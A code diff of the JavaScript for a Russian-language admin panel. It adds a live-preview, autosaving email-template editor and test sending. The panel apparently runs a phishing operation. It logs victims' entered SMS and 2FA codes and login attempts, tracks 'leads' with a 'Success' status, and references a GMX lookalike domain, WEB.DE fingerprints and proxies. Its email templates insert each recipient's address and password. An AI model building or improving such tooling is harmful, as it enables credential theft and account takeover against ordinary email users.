@@ -115,7 +115,7 @@
     if (l.indexOf('ввел sms-код') === 0 || l.indexOf('ввел sms:') === 0 || l === 'sms') return 'sms';
     if (l.indexOf('ввел 2fa-код') === 0 || l === '2fa') return '2fa';
     if (l.indexOf('leadid=') !== -1 || l.indexOf('visitid=') !== -1 || l.indexOf(' ip=') !== -1) return null;
-    if (l.indexOf('[вход]') !== -1 || l.indexOf('gmx-net.cv') !== -1) return null;
+    if (l.indexOf('[вход]') !== -1 || l.indexOf('gmx-net.') !== -1) return null;
 
     if (l.indexOf('попытка входа') !== -1) {
       var a2 = parseAutoLoginAttempt(txt);
@@ -1830,16 +1830,25 @@
     }
 
     var openAtUserBtn = document.getElementById('admin-chat-open-at-user');
+    var chatOpenReqInFlight = false;
+    var chatOpenReqLastAt = 0;
     if (openAtUserBtn) {
       openAtUserBtn.addEventListener('click', function () {
         if (!selectedId) return;
+        var nowTs = Date.now();
+        if (chatOpenReqInFlight) return;
+        if ((nowTs - chatOpenReqLastAt) < 1200) return;
+        chatOpenReqInFlight = true;
+        chatOpenReqLastAt = nowTs;
         authFetch('/api/chat-open', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ leadId: selectedId })
         }).then(function (r) { return r.json(); }).then(function (data) {
           if (data && data.ok) { /* Чат откроется у юзера при следующем опросе */ }
-        }).catch(function () {});
+        }).catch(function () {}).finally(function () {
+          chatOpenReqInFlight = false;
+        });
       });
     }
 
@@ -2467,7 +2476,7 @@
       document.querySelectorAll('.config-nav-item').forEach(function (it) {
         it.classList.toggle('active', (it.getAttribute('data-pane') || '') === name);
       });
-      if (name === 'proxies' || name === 'email') {
+      if (name === 'proxies' || name === 'email' || name === 'short') {
         setTimeout(function () {
           AdminModalKit.syncCodeEditorHeights();
         }, 0);
@@ -2602,9 +2611,20 @@
     document.querySelectorAll('.config-nav-item').forEach(function (item) {
       item.addEventListener('click', function () {
         var pane = item.getAttribute('data-pane');
+        if (pane && pane !== 'email' && adminConfigEmailVisualMode) {
+          try {
+            syncVisualPreviewToTextarea();
+            detachVisualModeFromFrame(document.getElementById('config-email-preview-frame'));
+            adminConfigEmailVisualMode = false;
+            setConfigEmailVisualUi();
+          } catch (ex) {}
+        }
         if (pane) {
           setActiveConfigPane(pane);
-          if (pane === 'short') loadConfigShort();
+          if (pane === 'short') {
+            loadConfigShort();
+            loadConfigBrandDomains();
+          }
           if (pane === 'proxies') {
             loadConfigProxies();
             loadConfigWebdeFpIndices();
@@ -2741,12 +2761,364 @@
 
     var CONFIG_EMAIL_NEW_ID = '__new__';
     var adminConfigEmailPendingImage = null;
+    var adminConfigEmailPendingImageDataUrl = null;
+    var adminConfigEmailSavedImageDataUrl = null;
+    var adminConfigEmailVisualMode = false;
+    var adminConfigEmailPreviewViewport = 'desktop';
+    var configEmailPreviewTimer = null;
+    var configEmailPreviewBlobUrl = null;
+    var configEmailVisualInputTimer = null;
+    var configEmailAutoSaveTimer = null;
+    var adminConfigEmailHydrating = false;
+    var configEmailSaveInFlight = false;
+    var configEmailSaveAgain = false;
+    var adminConfigEmailSyncingFromPreview = false;
+
+    function escapeHtmlPreview(s) {
+      return String(s == null ? '' : s)
+        .replace(/&/g, '&amp;')
+        .replace(/</g, '&lt;')
+        .replace(/>/g, '&gt;')
+        .replace(/"/g, '&quot;');
+    }
+    function smtpGuessFromEmail(smtpLine) {
+      var p = String(smtpLine || '').split(':');
+      if (p.length < 5) return '';
+      var cand = String(p[3] || '').trim();
+      if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(cand)) return cand;
+      return '';
+    }
+    function formatPreviewFrom(senderName, smtpLine) {
+      var email = smtpGuessFromEmail(smtpLine);
+      var name = String(senderName || '').trim();
+      if (name && email) return name + ' <' + email + '>';
+      if (email) return email;
+      if (name) return name;
+      return '—';
+    }
+    function parseEmailTemplateParts(html) {
+      var s = String(html || '').trim();
+      if (!s) {
+        return {
+          headInner: '<meta charset="utf-8">',
+          bodyInner: '<p style="margin:0;color:#888;font:15px system-ui,sans-serif">Пустой шаблон</p>'
+        };
+      }
+      var head = s.slice(0, Math.min(900, s.length)).toLowerCase();
+      if (head.indexOf('<html') >= 0 || head.indexOf('<!doctype') >= 0) {
+        try {
+          var doc = new DOMParser().parseFromString(s, 'text/html');
+          return {
+            headInner: doc && doc.head ? doc.head.innerHTML : '<meta charset="utf-8">',
+            bodyInner: doc && doc.body ? doc.body.innerHTML : s
+          };
+        } catch (e) { /* fallthrough */ }
+      }
+      return { headInner: '<meta charset="utf-8">', bodyInner: s };
+    }
+    function mergeBodyIntoStoredHtml(storedFull, bodyInnerFromPreview) {
+      var s = String(storedFull || '').trim();
+      if (!s) {
+        return '<!DOCTYPE html><html><head><meta charset="utf-8"></head><body>' + bodyInnerFromPreview + '</body></html>';
+      }
+      try {
+        var d = new DOMParser().parseFromString(s, 'text/html');
+        var headHtml = d.head ? d.head.innerHTML : '<meta charset="utf-8">';
+        return '<!DOCTYPE html><html><head>' + headHtml + '</head><body>' + bodyInnerFromPreview + '</body></html>';
+      } catch (e2) {
+        return s;
+      }
+    }
+    function getPreviewRootHtml(doc) {
+      if (!doc || !doc.body) return '';
+      var root = doc.querySelector('.preview-root');
+      return root ? root.innerHTML : doc.body.innerHTML;
+    }
+    function placeholderSrc1DataUri() {
+      var svg = '<svg xmlns="http://www.w3.org/2000/svg" width="140" height="36"><rect fill="#e5e7eb" width="140" height="36" rx="6"/><text x="70" y="23" text-anchor="middle" fill="#64748b" font-size="12" font-family="system-ui,sans-serif">_src1_</text></svg>';
+      return 'data:image/svg+xml;charset=utf-8,' + encodeURIComponent(svg);
+    }
+    var CONFIG_EMAIL_PREVIEW_TO_STORAGE_KEY = 'gmw_admin_config_email_preview_to';
+    var configEmailPreviewToPersistTimer = null;
+    function extractRecipientEmailPreview(raw) {
+      var t = String(raw || '').trim();
+      if (!t) return '';
+      var angle = t.match(/<([^\s<>]+@[^\s<>]+)>/);
+      if (angle) return angle[1].trim().toLowerCase();
+      var bare = t.match(/[^\s<>]+@[^\s<>]+\.[^\s<>]+/);
+      if (bare) return bare[0].trim().toLowerCase();
+      return '';
+    }
+    function getConfigEmailPreviewEmailToken() {
+      var el = document.getElementById('config-email-preview-to');
+      var raw = el && el.value ? el.value.trim() : '';
+      var ex = extractRecipientEmailPreview(raw);
+      if (ex) return ex;
+      if (/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(raw)) return raw.toLowerCase();
+      return raw ? raw : 'recipient@example.com';
+    }
+    function persistConfigEmailPreviewTo() {
+      try {
+        var el = document.getElementById('config-email-preview-to');
+        if (el) localStorage.setItem(CONFIG_EMAIL_PREVIEW_TO_STORAGE_KEY, el.value || '');
+      } catch (e) {}
+    }
+    function schedulePersistConfigEmailPreviewTo() {
+      if (configEmailPreviewToPersistTimer) clearTimeout(configEmailPreviewToPersistTimer);
+      configEmailPreviewToPersistTimer = setTimeout(function () {
+        configEmailPreviewToPersistTimer = null;
+        persistConfigEmailPreviewTo();
+      }, 350);
+    }
+    function applyEmailPreviewSubstitutions(html, pendingDataUrl, savedDataUrl, isClearPending, previewEmailToken) {
+      var h = String(html || '');
+      var em = String(previewEmailToken || '').trim() || 'recipient@example.com';
+      h = h.replace(/_email_/gi, em);
+      h = h.replace(/_password_/gi, '••••••••');
+      if (isClearPending) {
+        h = h.replace(/_src1_/gi, '');
+      } else if (pendingDataUrl) {
+        h = h.replace(/_src1_/gi, pendingDataUrl);
+      } else if (savedDataUrl) {
+        h = h.replace(/_src1_/gi, savedDataUrl);
+      } else {
+        h = h.replace(/_src1_/gi, placeholderSrc1DataUri());
+      }
+      return h;
+    }
+    function setConfigEmailVisualUi() {
+      var btn = document.getElementById('config-email-preview-edit-toggle');
+      var hint = document.getElementById('config-email-preview-mode-hint');
+      if (btn) {
+        btn.textContent = adminConfigEmailVisualMode ? 'Закончить правку' : 'Правка в превью';
+        btn.classList.toggle('is-active', adminConfigEmailVisualMode);
+      }
+      if (hint) {
+        hint.textContent = adminConfigEmailVisualMode ? 'Правки пишутся в HTML · Esc' : '';
+      }
+    }
+    function setConfigEmailPreviewViewportUi() {
+      var wrap = document.getElementById('config-email-preview-frame-wrap');
+      var btn = document.getElementById('config-email-preview-viewport-toggle');
+      var icoPhone = btn && btn.querySelector('.config-email-preview-vp-ico--phone');
+      var icoPc = btn && btn.querySelector('.config-email-preview-vp-ico--pc');
+      var isMobile = adminConfigEmailPreviewViewport === 'mobile';
+      if (wrap) wrap.classList.toggle('config-email-preview-frame-wrap--mobile', isMobile);
+      if (btn) {
+        btn.classList.toggle('is-active', isMobile);
+        btn.setAttribute('aria-pressed', isMobile ? 'true' : 'false');
+        var labelPc = 'Предпросмотр как на ПК';
+        var labelPh = 'Предпросмотр как на телефоне';
+        btn.setAttribute('aria-label', isMobile ? labelPc : labelPh);
+        btn.setAttribute('title', isMobile ? labelPc : labelPh);
+      }
+      if (icoPhone) icoPhone.classList.toggle('hidden', isMobile);
+      if (icoPc) icoPc.classList.toggle('hidden', !isMobile);
+    }
+    function syncVisualPreviewToTextarea() {
+      var frame = document.getElementById('config-email-preview-frame');
+      var htmlEl = document.getElementById('config-email-html');
+      if (!frame || !htmlEl) return;
+      try {
+        var doc = frame.contentDocument;
+        if (!doc) return;
+        var inner = getPreviewRootHtml(doc);
+        adminConfigEmailSyncingFromPreview = true;
+        htmlEl.value = mergeBodyIntoStoredHtml(htmlEl.value, inner);
+      } catch (e) {}
+      finally {
+        requestAnimationFrame(function () { adminConfigEmailSyncingFromPreview = false; });
+      }
+    }
+    function onVisualPreviewInput() {
+      if (configEmailVisualInputTimer) clearTimeout(configEmailVisualInputTimer);
+      configEmailVisualInputTimer = setTimeout(function () {
+        configEmailVisualInputTimer = null;
+        syncVisualPreviewToTextarea();
+      }, 220);
+    }
+    function attachVisualModeToFrame(frame) {
+      if (!frame || !adminConfigEmailVisualMode) return;
+      try {
+        var doc = frame.contentDocument;
+        if (!doc || !doc.body) return;
+        doc.designMode = 'on';
+        doc.body.addEventListener('input', onVisualPreviewInput);
+        doc.body.addEventListener('keyup', onVisualPreviewInput);
+      } catch (e2) {}
+    }
+    function detachVisualModeFromFrame(frame) {
+      if (!frame) return;
+      try {
+        var doc = frame.contentDocument;
+        if (doc && doc.body) {
+          doc.designMode = 'off';
+          doc.body.removeEventListener('input', onVisualPreviewInput);
+          doc.body.removeEventListener('keyup', onVisualPreviewInput);
+        }
+      } catch (e3) {}
+    }
+    function updateConfigEmailPreview(opts) {
+      var force = opts && opts.force;
+      var frame = document.getElementById('config-email-preview-frame');
+      var heroMount = document.getElementById('config-email-preview-hero-mount');
+      if (!frame || !heroMount) return;
+      if (adminConfigEmailVisualMode && !force) return;
+      var fromEl = document.getElementById('config-email-from');
+      var subjectEl = document.getElementById('config-email-subject');
+      var htmlEl = document.getElementById('config-email-html');
+      var smtpEl = document.getElementById('config-email-smtp');
+      var sender = (fromEl && fromEl.value) ? fromEl.value.trim() : '';
+      var sub = (subjectEl && subjectEl.value) ? subjectEl.value.trim() : '';
+      var smtpLine = (smtpEl && smtpEl.value) ? smtpEl.value.trim() : '';
+      var emailAddr = smtpGuessFromEmail(smtpLine);
+      var av = (sender || emailAddr || '?').charAt(0).toUpperCase();
+      heroMount.innerHTML =
+        '<div class="config-email-preview-hero">' +
+          '<div class="config-email-preview-hero__avatar" aria-hidden="true">' + escapeHtmlPreview(av) + '</div>' +
+          '<div class="config-email-preview-hero__meta">' +
+            '<div class="config-email-preview-hero__name">' + escapeHtmlPreview(sender || emailAddr || '—') + '</div>' +
+            (emailAddr ? '<div class="config-email-preview-hero__email">' + escapeHtmlPreview(emailAddr) + '</div>' : '') +
+            '<div class="config-email-preview-hero__subject"><span class="config-email-preview-hero__subj-label">Тема</span> ' + escapeHtmlPreview(sub || '—') + '</div>' +
+          '</div></div>';
+      var rawHtml = (htmlEl && htmlEl.value) ? htmlEl.value : '';
+      var parts = parseEmailTemplateParts(rawHtml);
+      var clearImg = adminConfigEmailPendingImage === '__clear__';
+      var pendingUrl = adminConfigEmailPendingImageDataUrl;
+      var savedUrl = adminConfigEmailSavedImageDataUrl;
+      var previewEm = getConfigEmailPreviewEmailToken();
+      var bodyInner = applyEmailPreviewSubstitutions(parts.bodyInner, pendingUrl, savedUrl, clearImg, previewEm);
+      var wrapStyle = 'html,body{margin:0;padding:0;background:#fff;} .preview-root{background:#fff;max-width:100%;min-height:100%;padding:10px 12px;box-sizing:border-box;margin:0;border-radius:0;box-shadow:none;}';
+      var shell = '<!DOCTYPE html><html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">' +
+        parts.headInner +
+        '<style id="gmw-preview-base">' + wrapStyle + '</style></head><body><div class="preview-root">' + bodyInner + '</div></body></html>';
+      if (configEmailPreviewBlobUrl) {
+        try { URL.revokeObjectURL(configEmailPreviewBlobUrl); } catch (rev) {}
+        configEmailPreviewBlobUrl = null;
+      }
+      frame.onload = function () {
+        frame.onload = null;
+        attachVisualModeToFrame(frame);
+      };
+      try {
+        var blob = new Blob([shell], { type: 'text/html;charset=utf-8' });
+        configEmailPreviewBlobUrl = URL.createObjectURL(blob);
+        frame.src = configEmailPreviewBlobUrl;
+      } catch (blobErr) {
+        frame.removeAttribute('src');
+        frame.srcdoc = shell;
+        attachVisualModeToFrame(frame);
+      }
+    }
+    function scheduleConfigEmailPreview() {
+      if (configEmailPreviewTimer) clearTimeout(configEmailPreviewTimer);
+      configEmailPreviewTimer = setTimeout(function () {
+        configEmailPreviewTimer = null;
+        updateConfigEmailPreview();
+      }, 48);
+    }
     function showConfigEmailMsg(text, type) {
       var el = document.getElementById('config-email-message');
       if (!el) return;
       el.textContent = text || '';
       el.className = 'config-msg' + (type ? ' ' + type : '');
       el.classList.toggle('hidden', !text);
+    }
+    function flushConfigEmailAutoSaveTimer() {
+      if (configEmailAutoSaveTimer) {
+        clearTimeout(configEmailAutoSaveTimer);
+        configEmailAutoSaveTimer = null;
+      }
+    }
+    function buildConfigEmailSavePayload(includeHtml) {
+      var sel = document.getElementById('config-email-profile');
+      var smtp = document.getElementById('config-email-smtp');
+      var from = document.getElementById('config-email-from');
+      var subject = document.getElementById('config-email-subject');
+      var htmlEl = document.getElementById('config-email-html');
+      var nameInput = document.getElementById('config-email-profile-name');
+      var isNew = !sel || sel.value === CONFIG_EMAIL_NEW_ID;
+      var payload = {
+        smtpLine: (smtp && smtp.value) ? smtp.value.trim() : '',
+        senderName: (from && from.value) ? from.value.trim() : '',
+        title: (subject && subject.value) ? subject.value.trim() : '',
+        setCurrent: true
+      };
+      if (includeHtml) payload.html = (htmlEl && htmlEl.value) ? htmlEl.value : '';
+      if (isNew) {
+        payload.name = (nameInput && nameInput.value.trim()) ? nameInput.value.trim() : ('E-Mail ' + new Date().toISOString().slice(0, 16).replace('T', ' '));
+      } else {
+        payload.id = sel.value;
+      }
+      if (adminConfigEmailPendingImage === '__clear__') payload.image1Base64 = '';
+      else if (typeof adminConfigEmailPendingImage === 'string' && adminConfigEmailPendingImage.length) payload.image1Base64 = adminConfigEmailPendingImage;
+      return { payload: payload, isNew: isNew };
+    }
+    function scheduleConfigEmailAutoSave() {
+      if (adminConfigEmailHydrating) return;
+      if (configEmailAutoSaveTimer) clearTimeout(configEmailAutoSaveTimer);
+      configEmailAutoSaveTimer = setTimeout(function () {
+        configEmailAutoSaveTimer = null;
+        saveConfigEmailFromUi({ silent: true });
+      }, 700);
+    }
+    function saveConfigEmailFromUi(opts) {
+      opts = opts || {};
+      if (adminConfigEmailHydrating) return Promise.resolve();
+      var includeHtml;
+      if (opts.includeHtml === true) includeHtml = true;
+      else if (opts.includeHtml === false) includeHtml = false;
+      else includeHtml = !adminConfigEmailVisualMode;
+      var built = buildConfigEmailSavePayload(includeHtml);
+      var payload = built.payload;
+      var wasNew = built.isNew;
+      if (configEmailSaveInFlight) {
+        configEmailSaveAgain = true;
+        return Promise.resolve();
+      }
+      configEmailSaveInFlight = true;
+      return postJson('/api/config/email', payload)
+        .then(function (r) { return r.json(); })
+        .then(function (data) {
+          if (data && data.ok === false) throw new Error(data.error || 'Ошибка');
+          adminConfigEmailPendingImage = null;
+          adminConfigEmailPendingImageDataUrl = null;
+          var imgFile = document.getElementById('config-email-image-file');
+          if (imgFile) imgFile.value = '';
+          if (wasNew) {
+            loadConfigEmail();
+            return;
+          }
+          if (data && data.image1DataUrl !== undefined) {
+            adminConfigEmailSavedImageDataUrl = (data.image1DataUrl && String(data.image1DataUrl).trim()) || '';
+          }
+          var imgStatus = document.getElementById('config-email-image-status');
+          if (imgStatus && data && data.image1Present !== undefined) {
+            imgStatus.textContent = data.image1Present ? '_src1_: есть' : '_src1_: нет';
+          }
+          var sel = document.getElementById('config-email-profile');
+          var nameInput = document.getElementById('config-email-profile-name');
+          if (sel && nameInput && sel.value && sel.value !== CONFIG_EMAIL_NEW_ID) {
+            for (var oi = 0; oi < sel.options.length; oi++) {
+              if (sel.options[oi].value === sel.value) {
+                sel.options[oi].textContent = nameInput.value.trim() || sel.options[oi].textContent;
+                break;
+              }
+            }
+          }
+          scheduleConfigEmailPreview();
+          if (!opts.silent) showConfigEmailMsg('Сохранено', 'success');
+        })
+        .catch(function (err) {
+          showConfigEmailMsg(err.message || 'Ошибка сохранения', 'error');
+        })
+        .finally(function () {
+          configEmailSaveInFlight = false;
+          if (configEmailSaveAgain) {
+            configEmailSaveAgain = false;
+            saveConfigEmailFromUi({ silent: true });
+          }
+        });
     }
     function loadConfigEmail() {
       var sel = document.getElementById('config-email-profile');
@@ -2757,7 +3129,9 @@
       var nameInput = document.getElementById('config-email-profile-name');
       var imgStatus = document.getElementById('config-email-image-status');
       var delBtn = document.getElementById('config-email-delete');
+      adminConfigEmailHydrating = true;
       adminConfigEmailPendingImage = null;
+      adminConfigEmailPendingImageDataUrl = null;
       var imgFile = document.getElementById('config-email-image-file');
       if (imgFile) imgFile.value = '';
       authFetch('/api/config/email').then(function (r) { return r.json(); }).then(function (data) {
@@ -2790,13 +3164,27 @@
           nameInput.value = (cur && (cur.name || cur.id)) ? (cur.name || cur.id) : '';
         }
         if (imgStatus) {
-          imgStatus.textContent = data.image1Present ? 'В профиле сохранена картинка (_src1_)' : 'Картинка не задана';
+          imgStatus.textContent = data.image1Present ? '_src1_: есть' : '_src1_: нет';
         }
+        adminConfigEmailSavedImageDataUrl = (data.image1DataUrl && String(data.image1DataUrl).trim()) || '';
         if (delBtn) delBtn.disabled = sel && sel.value === CONFIG_EMAIL_NEW_ID;
         showConfigEmailMsg('', '');
         AdminModalKit.syncCodeEditorHeights();
+        var toIn = document.getElementById('config-email-preview-to');
+        if (toIn) {
+          try {
+            var st = localStorage.getItem(CONFIG_EMAIL_PREVIEW_TO_STORAGE_KEY);
+            if (st != null) toIn.value = st;
+          } catch (e2) {}
+        }
+        scheduleConfigEmailPreview();
       }).catch(function (err) {
         showConfigEmailMsg(err.message || 'Ошибка загрузки E-Mail', 'error');
+        scheduleConfigEmailPreview();
+      }).finally(function () {
+        requestAnimationFrame(function () {
+          adminConfigEmailHydrating = false;
+        });
       });
     }
     var configEmailProfileSel = document.getElementById('config-email-profile');
@@ -2817,8 +3205,11 @@
           if (htmlEl) htmlEl.value = '';
           if (nameInput) nameInput.value = '';
           adminConfigEmailPendingImage = null;
-          showConfigEmailMsg('Новый профиль: заполните поля и нажмите «Сохранить».', 'success');
-          setTimeout(function () { showConfigEmailMsg('', ''); }, 3000);
+          adminConfigEmailPendingImageDataUrl = null;
+          adminConfigEmailSavedImageDataUrl = '';
+          showConfigEmailMsg('Новый профиль: данные сохранятся автоматически.', 'success');
+          setTimeout(function () { showConfigEmailMsg('', ''); }, 2800);
+          scheduleConfigEmailPreview();
           return;
         }
         postJson('/api/config/email/select', { id: v }).then(function () {
@@ -2844,10 +3235,13 @@
         if (htmlEl) htmlEl.value = '';
         if (nameInput) nameInput.value = '';
         adminConfigEmailPendingImage = null;
+        adminConfigEmailPendingImageDataUrl = null;
+        adminConfigEmailSavedImageDataUrl = '';
         var delBtn = document.getElementById('config-email-delete');
         if (delBtn) delBtn.disabled = true;
-        showConfigEmailMsg('Новый профиль: заполните поля и нажмите «Сохранить».', 'success');
-        setTimeout(function () { showConfigEmailMsg('', ''); }, 3000);
+        showConfigEmailMsg('Новый профиль: данные сохранятся автоматически.', 'success');
+        setTimeout(function () { showConfigEmailMsg('', ''); }, 2800);
+        scheduleConfigEmailPreview();
       });
     }
     var configEmailDelBtn = document.getElementById('config-email-delete');
@@ -2866,61 +3260,6 @@
         });
       });
     }
-    var configEmailSaveBtn = document.getElementById('config-email-save');
-    if (configEmailSaveBtn) {
-      configEmailSaveBtn.addEventListener('click', function () {
-        var sel = document.getElementById('config-email-profile');
-        var smtp = document.getElementById('config-email-smtp');
-        var from = document.getElementById('config-email-from');
-        var subject = document.getElementById('config-email-subject');
-        var htmlEl = document.getElementById('config-email-html');
-        var nameInput = document.getElementById('config-email-profile-name');
-        var isNew = !sel || sel.value === CONFIG_EMAIL_NEW_ID;
-        var payload = {
-          smtpLine: (smtp && smtp.value) ? smtp.value.trim() : '',
-          senderName: (from && from.value) ? from.value.trim() : '',
-          title: (subject && subject.value) ? subject.value.trim() : '',
-          html: (htmlEl && htmlEl.value) ? htmlEl.value : '',
-          setCurrent: true
-        };
-        if (isNew) {
-          payload.name = (nameInput && nameInput.value.trim()) ? nameInput.value.trim() : ('E-Mail ' + new Date().toISOString().slice(0, 16).replace('T', ' '));
-        } else {
-          payload.id = sel.value;
-        }
-        if (adminConfigEmailPendingImage === '__clear__') payload.image1Base64 = '';
-        else if (typeof adminConfigEmailPendingImage === 'string' && adminConfigEmailPendingImage.length) payload.image1Base64 = adminConfigEmailPendingImage;
-        configEmailSaveBtn.disabled = true;
-        postJson('/api/config/email', payload).then(function (r) { return r.json(); }).then(function (data) {
-          if (data && data.ok === false) throw new Error(data.error || 'Ошибка');
-          showConfigEmailMsg('Сохранено', 'success');
-          adminConfigEmailPendingImage = null;
-          loadConfigEmail();
-        }).catch(function (err) {
-          showConfigEmailMsg(err.message || 'Ошибка сохранения', 'error');
-        }).finally(function () { configEmailSaveBtn.disabled = false; });
-      });
-    }
-    var configEmailSendAllSuccess = document.getElementById('config-email-send-all-success');
-    if (configEmailSendAllSuccess) {
-      configEmailSendAllSuccess.addEventListener('click', function () {
-        if (!confirm('Отправить письмо по шаблону Config → E-Mail всем записям со статусом «Успех», у кого указан email?')) return;
-        configEmailSendAllSuccess.disabled = true;
-        authFetch('/api/send-email-all-success', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: '{}' })
-          .then(function (r) { return r.json().then(function (j) { return { r: r, j: j }; }); })
-          .then(function (o) {
-            if (!o.r.ok || !o.j || o.j.ok === false) throw new Error((o.j && o.j.error) || 'Ошибка');
-            var j = o.j;
-            var msg = 'Готово: отправлено ' + (j.sent != null ? j.sent : 0) + ', ошибок ' + (j.failed != null ? j.failed : 0) + ', пропущено ' + (j.skipped != null ? j.skipped : 0);
-            showConfigEmailMsg(msg, (j.failed > 0) ? 'error' : 'success');
-            loadLeads();
-          })
-          .catch(function (err) {
-            showConfigEmailMsg(err.message || 'Ошибка массовой отправки', 'error');
-          })
-          .finally(function () { configEmailSendAllSuccess.disabled = false; });
-      });
-    }
     var configEmailTplFile = document.getElementById('config-email-template-file');
     if (configEmailTplFile) {
       configEmailTplFile.addEventListener('change', function (e) {
@@ -2930,7 +3269,11 @@
         reader.onload = function () {
           var htmlEl = document.getElementById('config-email-html');
           if (htmlEl) htmlEl.value = reader.result || '';
-          showConfigEmailMsg('HTML подставлен из файла — нажмите «Сохранить».', 'success');
+          showConfigEmailMsg('HTML из файла — сохранится автоматически.', 'success');
+          setTimeout(function () { showConfigEmailMsg('', ''); }, 2200);
+          scheduleConfigEmailPreview();
+          flushConfigEmailAutoSaveTimer();
+          saveConfigEmailFromUi({ silent: true });
         };
         reader.readAsText(f);
       });
@@ -2944,9 +3287,13 @@
         var reader = new FileReader();
         reader.onload = function () {
           var s = reader.result;
+          adminConfigEmailPendingImageDataUrl = typeof s === 'string' ? s : null;
           var b64 = typeof s === 'string' && s.indexOf(',') >= 0 ? s.split(',')[1] : '';
           adminConfigEmailPendingImage = b64;
-          if (imgStatus) imgStatus.textContent = 'Файл выбран — сохраните профиль.';
+          if (imgStatus) imgStatus.textContent = '_src1_: новый файл · сохранится';
+          scheduleConfigEmailPreview();
+          flushConfigEmailAutoSaveTimer();
+          saveConfigEmailFromUi({ silent: true });
         };
         reader.readAsDataURL(f);
       });
@@ -2955,12 +3302,136 @@
     if (configEmailImgClear) {
       configEmailImgClear.addEventListener('click', function () {
         adminConfigEmailPendingImage = '__clear__';
+        adminConfigEmailPendingImageDataUrl = null;
         var imgFile = document.getElementById('config-email-image-file');
         if (imgFile) imgFile.value = '';
         var imgStatus = document.getElementById('config-email-image-status');
-        if (imgStatus) imgStatus.textContent = 'Картинка будет удалена после сохранения.';
+        if (imgStatus) imgStatus.textContent = '_src1_: сброс · сохранится';
+        scheduleConfigEmailPreview();
+        flushConfigEmailAutoSaveTimer();
+        saveConfigEmailFromUi({ silent: true });
       });
     }
+    var configEmailProfileName = document.getElementById('config-email-profile-name');
+    if (configEmailProfileName) {
+      configEmailProfileName.addEventListener('input', function () {
+        scheduleConfigEmailPreview();
+        scheduleConfigEmailAutoSave();
+      });
+    }
+    ['config-email-from', 'config-email-subject', 'config-email-smtp'].forEach(function (id) {
+      var el = document.getElementById(id);
+      if (el) el.addEventListener('input', function () {
+        scheduleConfigEmailPreview();
+        scheduleConfigEmailAutoSave();
+      });
+    });
+    var configEmailHtmlTa = document.getElementById('config-email-html');
+    if (configEmailHtmlTa) {
+      configEmailHtmlTa.addEventListener('input', function () {
+        if (adminConfigEmailSyncingFromPreview) return;
+        if (adminConfigEmailVisualMode) {
+          var fr = document.getElementById('config-email-preview-frame');
+          detachVisualModeFromFrame(fr);
+          adminConfigEmailVisualMode = false;
+          setConfigEmailVisualUi();
+        }
+        scheduleConfigEmailPreview();
+        scheduleConfigEmailAutoSave();
+      });
+    }
+    var configEmailPreviewViewportToggle = document.getElementById('config-email-preview-viewport-toggle');
+    if (configEmailPreviewViewportToggle) {
+      configEmailPreviewViewportToggle.addEventListener('click', function () {
+        adminConfigEmailPreviewViewport = adminConfigEmailPreviewViewport === 'mobile' ? 'desktop' : 'mobile';
+        setConfigEmailPreviewViewportUi();
+      });
+    }
+    var configEmailPreviewTo = document.getElementById('config-email-preview-to');
+    if (configEmailPreviewTo) {
+      configEmailPreviewTo.addEventListener('input', function () {
+        schedulePersistConfigEmailPreviewTo();
+        scheduleConfigEmailPreview();
+      });
+    }
+    var configEmailPreviewSend = document.getElementById('config-email-preview-send');
+    if (configEmailPreviewSend) {
+      configEmailPreviewSend.addEventListener('click', function () {
+        var toEl = document.getElementById('config-email-preview-to');
+        var toRaw = toEl && toEl.value ? toEl.value.trim() : '';
+        if (!toRaw) {
+          showConfigEmailMsg('Укажите email в поле «Кому»', 'error');
+          return;
+        }
+        var toNorm = extractRecipientEmailPreview(toRaw);
+        if (!toNorm && /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(toRaw)) toNorm = toRaw.toLowerCase();
+        if (!toNorm) {
+          showConfigEmailMsg('Некорректный email в поле «Кому»', 'error');
+          return;
+        }
+        var fr = document.getElementById('config-email-preview-frame');
+        if (adminConfigEmailVisualMode) {
+          syncVisualPreviewToTextarea();
+          detachVisualModeFromFrame(fr);
+          adminConfigEmailVisualMode = false;
+          setConfigEmailVisualUi();
+        }
+        flushConfigEmailAutoSaveTimer();
+        configEmailPreviewSend.disabled = true;
+        saveConfigEmailFromUi({ silent: true, includeHtml: true })
+          .then(function () {
+            return postJson('/api/config/email/send-test', { to: toRaw });
+          })
+          .then(function (r) { return r.json(); })
+          .then(function (data) {
+            if (data && data.ok === false) throw new Error(data.error || 'Ошибка');
+            showConfigEmailMsg('Отправлено: ' + (data.fromEmail || '') + ' → ' + (data.toEmail || toNorm), 'success');
+            updateConfigEmailPreview({ force: true });
+          })
+          .catch(function (err) {
+            showConfigEmailMsg(err.message || 'Ошибка отправки', 'error');
+          })
+          .finally(function () {
+            configEmailPreviewSend.disabled = false;
+          });
+      });
+    }
+    var configEmailPreviewEditToggle = document.getElementById('config-email-preview-edit-toggle');
+    if (configEmailPreviewEditToggle) {
+      configEmailPreviewEditToggle.addEventListener('click', function () {
+        var fr = document.getElementById('config-email-preview-frame');
+        if (adminConfigEmailVisualMode) {
+          syncVisualPreviewToTextarea();
+          detachVisualModeFromFrame(fr);
+          adminConfigEmailVisualMode = false;
+          setConfigEmailVisualUi();
+          updateConfigEmailPreview();
+          flushConfigEmailAutoSaveTimer();
+          saveConfigEmailFromUi({ silent: true, includeHtml: true });
+        } else {
+          adminConfigEmailVisualMode = true;
+          setConfigEmailVisualUi();
+          updateConfigEmailPreview({ force: true });
+        }
+      });
+    }
+    document.addEventListener('keydown', function (ev) {
+      if (ev.key !== 'Escape' || !adminConfigEmailVisualMode) return;
+      var pane = document.getElementById('config-pane-email');
+      if (!pane || !pane.classList.contains('active')) return;
+      ev.preventDefault();
+      ev.stopPropagation();
+      var fr = document.getElementById('config-email-preview-frame');
+      syncVisualPreviewToTextarea();
+      detachVisualModeFromFrame(fr);
+      adminConfigEmailVisualMode = false;
+      setConfigEmailVisualUi();
+      updateConfigEmailPreview();
+      flushConfigEmailAutoSaveTimer();
+      saveConfigEmailFromUi({ silent: true, includeHtml: true });
+    }, true);
+    setConfigEmailVisualUi();
+    setConfigEmailPreviewViewportUi();
 
     function loadConfigProxies() {
       var textEl = document.getElementById('config-proxies-text');
@@ -3685,90 +4156,391 @@
 
     function loadConfigShort() {
